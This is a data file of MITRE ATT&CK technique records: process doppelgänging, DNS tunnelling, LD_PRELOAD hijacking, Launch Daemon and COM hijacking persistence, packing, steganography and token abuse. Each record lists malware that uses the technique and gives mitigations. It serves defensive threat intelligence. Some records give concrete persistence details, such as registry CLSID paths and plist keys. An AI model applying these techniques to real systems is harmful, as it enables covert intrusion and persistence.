{"text": " Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF) Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017) Adversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017) Process Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017): * Transact – Create a TxF transaction using a legitimate executable then overwrite the", "idx": "https://attack.mitre.org/techniques/T1055/013", "title": "Process Doppelgänging", "entity": "Process Doppelgänging", "entity_type": "techniques", "entity_context": ["Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. ", "Bazar can inject into a target process using process doppelgänging.", "Leafminer has used Process Doppelgänging to evade security software while deploying tools on compromised systems.\t", "SynAck abuses NTFS transactions to launch and conceal malicious processes."], "is_subtechnique": true}
{"text": " Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)", "idx": "https://attack.mitre.org/techniques/T1071/004", "title": "DNS", "entity": "DNS", "entity_type": "techniques", "entity_context": ["Consider filtering DNS requests to unknown, untrusted, or known bad domains and resources. Resolving DNS requests with on-premise/proxy servers may also disrupt adversary attempts to conceal data within DNS packets. ", "APT18 uses DNS for C2 communications.", "Cobalt Strike can use a custom command and control protocol that can be encapsulated in DNS. All protocols use their standard assigned ports.\t", "HTTPBrowser has used DNS for command and control.", "TEXTMATE uses DNS TXT records for C2.", "SOUNDBITE communicates via DNS for C2.", "Chimera has used Cobalt Strike to encapsulate C2 in DNS traffic.", "NanHaiShu uses DNS for the C2 communications.", "Ebury has used DNS requests over UDP port 53 for C2.\t", "RDAT has used DNS to communicate with the C2.\t", "SombRAT can communicate over DNS with the C2 server.", "InvisiMole has used a custom implementation of DNS tunneling to embed C2 communications in DNS requests and replies.", "Ke3chang malware RoyalDNS has used DNS for C2.", "APT39 has used remote access tools that leverage DNS in communications with C2.", "Tropic Trooper's backdoor has communicated to the C2 over the DNS protocol.\t", "Denis has used DNS tunneling for C2 communications.", "Remsec is capable of using DNS for C2.", "Helminth can use DNS for C2.", "WellMess has the ability to use DNS tunneling for C2 communications.", "ShadowPad has used DNS tunneling for C2 communications.", "BONDUPDATER can use DNS and TXT records within its DNS tunneling protocol for command and control.", "POWRUNER can use DNS for C2 communications.", "POWERSOURCE uses DNS TXT records for C2.", "Goopy has the ability to communicate with its C2 over DNS.\t", "Pisloader uses DNS as its C2 protocol.", "APT41 used DNS for C2 communications. ", "SUNBURST used DNS for C2 traffic designed to mimic normal SolarWinds API communications.", "Sliver can support C2 communications over DNS.", "Variants of Anchor can use DNS tunneling to communicate with C2.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. ", "Cobalt Group has used DNS tunneling for C2.", "QUADAGENT uses DNS for C2 communications.", "Cobian RAT uses DNS for C2.", "PlugX can be configured to use DNS for command and control.", "Matryoshka uses DNS for C2.", "OilRig has used DNS for C2 including the publicly available <code>requestbin.net</code> tunneling service.", "FIN7 has performed C2 using DNS via A, OPT, and TXT records."], "is_subtechnique": true}
{"text": " Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.(Citation: Cisco Synful Knock Evolution) Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key. Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) introduced to the system through [Modify System Image](https://attack.mitre.org/techniques/T1601) to change the configuration of the device. (Citation: Cisco Blog Legacy Device Attacks)", "idx": "https://attack.mitre.org/techniques/T1600/001", "title": "Reduce Key Space", "entity": "Reduce Key Space", "entity_type": "techniques", "entity_context": [], "is_subtechnique": true}
{"text": " Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD) On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped", "idx": "https://attack.mitre.org/techniques/T1574/006", "title": "Dynamic Linker Hijacking", "entity": "Dynamic Linker Hijacking", "entity_type": "techniques", "entity_context": ["XCSSET adds malicious file paths to the <code>DYLD_FRAMEWORK_PATH</code> and <code>DYLD_LIBRARY_PATH</code> environment variables to execute malicious code.", "Rocke has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.\t", "When System Integrity Protection (SIP) is enabled in macOS, the aforementioned environment variables are ignored when executing protected binaries. Third-party applications can also leverage Apple’s Hardened Runtime, ensuring these environment variables are subject to imposed restrictions. Admins can add restrictions to applications by setting the setuid and/or setgid bits, use entitlements, or have a __RESTRICT segment in the Mach-O binary.", "APT41 has configured payloads to load via LD_PRELOAD.\t", "Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software.", "Hildegard has modified /etc/ld.so.preload to intercept shared library import functions.", "HiddenWasp adds itself as a shared object to the LD_PRELOAD environment variable.", "Ebury has injected its dynamic library into descendent processes of sshd via LD_PRELOAD."], "is_subtechnique": true}
{"text": " Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists) Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection) Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation:", "idx": "https://attack.mitre.org/techniques/T1543/004", "title": "Launch Daemon", "entity": "Launch Daemon", "entity_type": "techniques", "entity_context": ["AppleJeus has placed a plist file within the <code>LaunchDaemons</code> folder and launched it manually.", "If running with <code>root</code> permissions, OSX_OCEANLOTUS.D can create a persistence file in the folder <code>/Library/LaunchDaemons</code>.", "XCSSET uses the ssh launchdaemon to elevate privileges, bypass system controls, and enable remote access to the victim.", "Use auditing tools capable of detecting folder permissions abuse opportunities on systems, especially reviewing changes made to folders by third-party software.", "Bundlore can persist via a LaunchDaemon.", "Dacls can establish persistence via a Launch Daemon.", "LoudMiner adds plist files with the naming format <code>com.random_name.plist</code> in the <code>/Library/LaunchDaemons</code> folder with the RunAtLoad and KeepAlive keys set to <code>true</code>.", "When running with root privileges after a Launch Agent is installed, ThiefQuest installs a plist file to the <code>/Library/LaunchDaemons/</code> folder with the <code>RunAtLoad</code> key set to <code>true</code> establishing persistence as a Launch Daemon. ", "Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create new Launch Daemons."], "is_subtechnique": true}
{"text": " Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based(Citation: CloudSploit - Unused AWS Regions) systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs) Additionally, some cryptocurrency mining malware kills off processes for competing malware to ensure it’s not competing for resources.(Citation: Trend Micro War of Crypto Miners)", "idx": "https://attack.mitre.org/techniques/T1496", "title": "Resource Hijacking", "entity": "Resource Hijacking", "entity_type": "techniques", "entity_context": ["Blue Mockingbird has used XMRIG to mine cryptocurrency on victim systems.", "Skidmap is a kernel-mode rootkit used for cryptocurrency mining.", "Hildegard has used xmrig to mine cryptocurrency.", "Rocke has distributed cryptomining malware.", "Bonadan can download an additional module which has a cryptocurrency mining extension.", "Kinsing has created and run a Bitcoin cryptocurrency miner.", "LoudMiner harvested system resources to mine cryptocurrency, using XMRig to mine Monero.\t", "TeamTNT has deployed XMRig Docker images to mine cryptocurrency. ", "APT41 deployed a Monero cryptocurrency mining tool in a victim’s environment.", "CookieMiner has loaded coinmining software onto systems to mine for Koto cryptocurrency. ", "Lucifer can use system resources to mine cryptocurrency, dropping XMRig to mine Monero.", "Imminent Monitor has the capability to run a cryptocurrency miner on the victim machine."], "is_subtechnique": false}
{"text": " Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files. [Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) By the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)", "idx": "https://attack.mitre.org/techniques/T1027/003", "title": "Steganography", "entity": "Steganography", "entity_type": "techniques", "entity_context": ["RegDuke can hide data in images, including use of the Least Significant Bit (LSB).", "RDAT can also embed data within a BMP image prior to exfiltration.\t", "Okrum's payload is encrypted and embedded within its loader, or within a legitimate PNG file.", "ProLock can use .jpg and .bmp files to store its payload.", "ObliqueRAT can hide its payload in BMP images hosted on compromised websites.", "MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.", "IcedID has embedded binaries within RC4 encrypted .png files.", "Bandook has used .PNG images within a zip file to build the executable. ", "Raindrop used steganography to locate the start of its encoded payload within legitimate 7-Zip code.", "Avenger can extract backdoor malware from downloaded images.", "Andariel has hidden malicious executables within PNG files.", "BRONZE BUTLER has used steganography in multiple operations to conceal malicious payloads.", "TA551 has hidden encoded data for malware DLLs in a PNG.", "PolyglotDuke can use steganography to hide C2 information in images.", "LiteDuke has used image files to hide its loader component.", "Tropic Trooper has used JPG files with encrypted payloads to mask their backdoor routines and evade detection.", "Ramsay has PE data embedded within JPEG files contained within Word documents.", "APT37 uses steganography to send images to users that are embedded with shellcode.", "Leviathan has used steganography to hide stolen data inside other files stored on Github.", "PowerDuke uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA). ", "BBK can extract a malicious Portable Executable (PE) from a photo.", "ABK can extract a malicious Portable Executable (PE) from a photo.", "build_downer can extract malware from a downloaded JPEG."], "is_subtechnique": true}
{"text": " Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "idx": "https://attack.mitre.org/techniques/T1041", "title": "Exfiltration Over C2 Channel", "entity": "Exfiltration Over C2 Channel", "entity_type": "techniques", "entity_context": ["BLINDINGCAN has sent user and system information to a C2 server via HTTP POST requests.", "APT32's backdoor has exfiltrated data using the already opened channel with its C&C server.", "BoxCaon uploads files and data from a compromised host over the existing C2 channel.", "Grandoreiro can send data it retrieves to the C2 server.", "Drovorub can exfiltrate files over C2 infrastructure.", "Sandworm Team has sent system information to its C2 server using HTTP.\t", "MobileOrder exfiltrates data to its C2 server over the same protocol as C2 communications.", "Pupy can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.", "Spark has exfiltrated data over the C2 channel. ", "Crutch can exfiltrate data over the primary C2 channel (Dropbox HTTP API).", "Lokibot has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.", "MuddyWater has used C2 infrastructure to receive exfiltrated data.", "EVILNUM can upload files over the C2 channel from the infected host. ", "DustySky has exfiltrated data to the C2 server.", "GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data.", "Industroyer sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.", "AppleJeus has exfiltrated collected host information to a C2 server.", "Goopy has the ability to exfiltrate data over the Microsoft Outlook C2 channel.", "REvil can exfiltrate host and malware information to C2 servers.", "StrongPity can exfiltrate collected documents through C2 channels.", "Bankshot exfiltrates data over its C2 channel.", "Rising Sun can send data gathered from the infected machine via HTTP POST request to the C2.\t", "PowerShower has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.", "Data exfiltration is done by Okrum using the already opened channel with the C2 server.", "Sliver can exfiltrate files from the victim using the <code>download</code> command.", "Imminent Monitor has uploaded a file containing debugger logs, network information and system information to the C2.", "Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.", "Machete's collected data is exfiltrated over the same channel used for C2.", "Chimera has used Cobalt Strike C2 beacons for data exfiltration. ", "Valak has the ability to exfiltrate data over the C2 channel.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level", "BLUELIGHT has exfiltrated data over its C2 channel.", "GoldMax can exfiltrate files over the existing C2 channel.", "MarkiRAT can exfiltrate locally stored data via its C2.", "PoetRAT has exfiltrated data over the C2 channel.", "SideTwist has exfiltrated data over its C2 channel.", "TajMahal has the ability to send collected files over its C2.", "CallMe exfiltrates data to its C2 server over the same protocol as C2 communications.", "OopsIE can upload files from the victim's machine to its C2 server.", "Higaisa exfiltrated data over its C2 channel.", "Remexi performs exfiltration over BITSAdmin, which is also used for the C2 channel.", "RDAT can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.", "Stuxnet sends compromised victim information via HTTP.", "njRAT has used HTTP to receive stolen information from the infected machine.\t", "ThiefQuest exfiltrates targeted file extensions in the <code>/Users/</code> folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.", "HotCroissant has the ability to download files from the infected host to the command and control (C2) server.", "Kessel has exfiltrated information gathered from the infected system to the C2 server.", "Data loss prevention can detect and block sensitive data being sent over unencrypted protocols.", "Adversaries can direct BACKSPACE to upload files to the C2 Server.", "HOPLIGHT has used its C2 channel to exfiltrate data.\t", "AppleSeed can exfiltrate files via the C2 channel.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. ", "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is uploaded to one of its 10 C2 servers. Another Lazarus Group malware sample also performs exfiltration over the C2 channel.", "QakBot can send stolen information to C2 nodes including passwords, accounts, and emails.", "APT39 has exfiltrated stolen victim data through C2 communications.", "Empire can send data gathered from a target through the command and control channel.", "A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server.", "Dyre has the ability to send information staged on a compromised host externally to C2.", "Bandook can upload files from a victim's machine over the C2 channel.", "MechaFlounder has the ability to send the compromised user's account name and hostname within a URL to C2.", "Carberp has exfiltrated data via HTTP to already established C2 servers.", "Caterpillar WebShell can upload files over the C2 channel. ", "Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.", "Attor has exfiltrated data over the C2 channel.", "Emotet has been seen exfiltrating system information stored within cookies sent within an HTTP GET request back to its C2 servers. ", "Frankenstein has collected information via Empire, which is automatically sent the data back to the adversary's C2.", "TrickBot can send information about the compromised host and upload data to a hardcoded C2 server.", "Ebury can exfiltrate SSH credentials through custom DNS queries.", "LightNeuron exfiltrates data over its email C2 channel.", "SLOTHFULMEDIA has sent system information to a C2 server via HTTP and HTTPS POST requests.", "ADVSTORESHELL exfiltrates data over the same channel used for C2.", "Ursnif has used HTTP POSTs to exfil gathered information.", "Octopus has uploaded stolen files and data from a victim's machine over its C2 channel.", "ZIRCONIUM has exfiltrated files via the Dropbox API C2.", "Operation Wocao has used the Xserver backdoor to exfiltrate data.", "GrimAgent has sent data related to a compromise host over its C2 channel.", "KGH_SPY can exfiltrate collected information from the host to the C2 server.", "Zebrocy has exfiltrated data to the designated C2 server using HTTP POST requests. ", "Leviathan has exfiltrated data over its C2 channel.", "Astaroth exfiltrates collected information from its r1.log file to the external C2 server. ", "GoldenSpy has exfiltrated host environment information to an external C2 domain via port 9006.\t", "Kimsuky has exfiltrated data over its email C2 channel.", "Pteranodon exfiltrates screenshot files to its C2 server.", "NETEAGLE is capable of reading files over the C2 channel.", "HAWKBALL has sent system information and files over the C2 channel.", "ROKRAT sends collected files back over same C2 channel.", "XCSSET exfiltrates data stolen from a system over its C2 channel.", "SMOKEDHAM has exfiltrated data to its C2 server.", "Doki has used Ngrok to establish C2 and exfiltrate data.", "APT3 has a tool that exfiltrates data over the C2 channel.", "After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel.", "Cannon exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.", "Penquin can execute the command code <code>do_upload</code> to send files to C2.", "Proxysvc performs data exfiltration over the control server channel using a custom protocol.", "ShimRatReporter sent generated reports to the C2 via HTTP POST requests.", "Metamorfo can send the data it collects to the C2 server. ", "Psylo exfiltrates data to its C2 server over the same protocol as C2 communications."], "is_subtechnique": false}
{"text": " Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.", "idx": "https://attack.mitre.org/techniques/T1027/002", "title": "Software Packing", "entity": "Software Packing", "entity_type": "techniques", "entity_context": ["BLINDINGCAN has been packed with the UPX packer.", "ZIRCONIUM has used multi-stage packers for exploit code.", "GALLIUM packed some payloads using different types of packers, both known and custom.", "NETWIRE has used .NET packer tools to evade detection.", "Dok is packed with an UPX executable packer.", "FYAnti has used ConfuserEx to pack its .NET module.", "A FinFisher variant uses a custom packer.", "LiteDuke has been packed with multiple layers of encryption.", "Cuba has a packed payload when delivered. ", "TeamTNT has used UPX and Ezuri packer to pack its binaries.", "A Patchwork payload was packed with UPX.", "Machete has been packed with NSIS. ", "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder.", "Night Dragon is known to use software packing in its tools.", "TrickBot leverages a custom packer to obfuscate its functionality.", "GreyEnergy is packed for obfuscation.", "TA505 has used UPX to obscure malicious code.", "Lokibot has used several packing methods for obfuscation.", "AppleSeed has used UPX packers for its payload DLL.", "QakBot can encrypt and pack malicious payloads.", "Anchor has come with a packed payload.", "Sandworm Team used UPX to pack a copy of Mimikatz. ", "Elderwood has packed malware payloads before delivery to victims.", "ShimRat's loader has been packed with the compressed ShimRat core DLL and the legitimate DLL for it to hijack.", "Valak has used packed DLL payloads.", "H1N1 uses a custom packing algorithm.", "DarkComet has the option to compress its payload using UPX or MPRESS.", "A version of Daserf uses the MPRESS packer.", "OopsIE uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.", "Uroburos uses a custom packer.", "Lucifer has used UPX packed binaries.", "APT39 has packed tools with UPX, and has repacked a modified version of Mimikatz to thwart anti-virus detection.", "Metamorfo has used VMProtect to pack and protect files. ", "China Chopper's client component is packed with UPX.", "FatDuke has been regularly repacked by its operators to create large binaries and evade detection.", "Some ZeroT DLL files have been packed with UPX.", "VERMIN is initially packed.", "HotCroissant has used the open source UPX executable packer.", "CSPY Downloader has been packed with UPX.", "yty packs a plugin with UPX.", "Spark has been packed with Enigma Protector to obfuscate its contents. ", "OSX_OCEANLOTUS.D has a variant that is packed with UPX.", "GoldMax has been packed for obfuscation.", "The White Company has obfuscated their payloads through packing.", "jRAT payloads have been packed.", "Astaroth uses a software packer called Pe123\\RPolyCryptor.", "Dyre has been delivered with encrypted resources and must be unpacked for execution.", "Clop has been packed to help avoid detection.", "Versions of Babuk have been packed.", "CostaBricks can implement a custom-built virtual machine mechanism to obfuscate its code.", "Kimsuky has packed malware with UPX.", "Emotet has used custom packers to protect its payloads.", "Zebrocy's Delphi variant was packed with UPX.", "Hildegard has packed ELF files into other binaries.", "Employ heuristic-based malware detection. Ensure updated virus definitions and create custom signatures for observed malware. ", "Bazar has a variant with a packed payload.", "SeaDuke has been packed with the UPX packer.", "Dark Caracal has used UPX to pack Bandook.", "Trojan.Karagany samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.", "Melcoz has been packed with VMProtect and Themida.", "Raindrop used a custom packer for its Cobalt Strike payload, which was compressed using the LZMA algorithm.", "APT29 used UPX to pack files.", "SDBbot has used a packed installer file.", "IcedID has packed and encrypted its loader module.", "APT3 has been known to pack their tools. ", "APT38 has used several code packing methods such as Themida, Enigma, VMProtect, and Obsidium, to pack their implants.", "Egregor's payloads are custom-packed, archived and encrypted to prevent analysis."], "is_subtechnique": true}
{"text": " Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model) References to various COM objects are stored in the Registry. Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.", "idx": "https://attack.mitre.org/techniques/T1546/015", "title": "Component Object Model Hijacking", "entity": "Component Object Model Hijacking", "entity_type": "techniques", "entity_context": ["APT28 has used COM hijacking for persistence by replacing the legitimate <code>MMDeviceEnumerator</code> object with a payload.", "ComRAT samples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry location <code>HKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32</code>.", "Mosquito uses COM hijacking as a method of persistence.", "JHUHUGIT has used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).", "KONNI has modified ComSysApp service to load the malicious DLL payload.", "Some variants of ADVSTORESHELL achieve persistence by registering the payload as a Shell Icon Overlay handler COM object.", "BBSRAT has been seen persisting via COM hijacking through replacement of the COM object for MruPidlList <code>{42aedc87-2188-41fd-b9a3-0c966feabec1}</code> or Microsoft WBEM New Event Subsystem <code>{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}</code> depending on the system's CPU architecture."], "is_subtechnique": true}
{"text": " Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials. Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta) For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017) Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the", "idx": "https://attack.mitre.org/techniques/T1550/001", "title": "Application Access Token", "entity": "Application Access Token", "entity_type": "techniques", "entity_context": ["Update corporate policies to restrict what types of third-party applications may be added to any online service or tool that is linked to the company's information, accounts or network (e.g., Google, Microsoft, Dropbox, Basecamp, GitHub). However, rather than providing high-level guidance on this, be extremely specific—include a list of per-approved applications and deny all others not on the list. Administrators may also block end-user consent through administrative portals, such as the Azure Portal, disabling users from authorizing third-party apps through OAuth and forcing administrative consent.", "Administrators can leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.", "File encryption should be enforced across email communications containing sensitive information that may be obtained through access to email services.", "APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail."], "is_subtechnique": true}
{"text": " Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566). Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)). A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries can use a compromised email account to hijack existing email threads with targets of interest.", "idx": "https://attack.mitre.org/techniques/T1586/002", "title": "Email Accounts", "entity": "Email Accounts", "entity_type": "techniques", "entity_context": ["Leviathan has compromised email accounts to conduct social engineering attacks.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "IndigoZebra has compromised legitimate email accounts to use in their spearphishing operations.", "Kimsuky has compromised email accounts to send spearphishing e-mails.", "Magic Hound has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information."], "is_subtechnique": true}
